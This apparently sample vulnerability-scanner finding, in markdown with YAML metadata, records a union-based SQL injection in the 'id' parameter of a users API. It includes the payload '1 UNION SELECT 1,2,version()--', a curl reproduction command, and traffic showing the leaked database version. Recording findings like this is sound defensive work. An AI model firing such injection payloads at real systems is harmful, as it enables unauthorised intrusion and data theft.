---
occurrenceId: occ-9c0d1e2f
findingId: fin-d1a7e8b9
definitionId: def-40018
pluginId: "40018"
name: "GET /api/v1/users?id=1 UNION SELECT 1,2,version()--"
url: "https://my-app.com/api/v1/users"
method: "GET"
param: "id"
attack: "1 UNION SELECT 1,2,version()--"
evidence: "union-based SQLi leaked DB version in response"
risk: "High"
riskcode: "3"
confidence: "Medium"
sourceid: ""
scan:
  label: "Run 2025-08-19"
domain:
  label: "my-app"
analyst:
  status: "open"
---

# SQL Injection occurrence: union-based

> [!summary]
> - Finding: [[sample-sqli-finding|SQL Injection - /api/v1/users]]
> - Param: `id`
> - Attack: `1 UNION SELECT 1,2,version()--`
> - Evidence: database version exposed
> - Status: open

## Reproduce
```bash
curl -sS "https://my-app.com/api/v1/users?id=1%20UNION%20SELECT%201,2,version()--" -H "Accept: application/json"
```

## Traffic

### Request
```
GET /api/v1/users?id=1%20UNION%20SELECT%201,2,version()-- HTTP/1.1
Host: my-app.com
User-Agent: ZAP
Accept: application/json
```

### Response
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

[{"id":1,"name":"PostgreSQL 14.5 on x86_64-pc-linux-gnu"}]
```
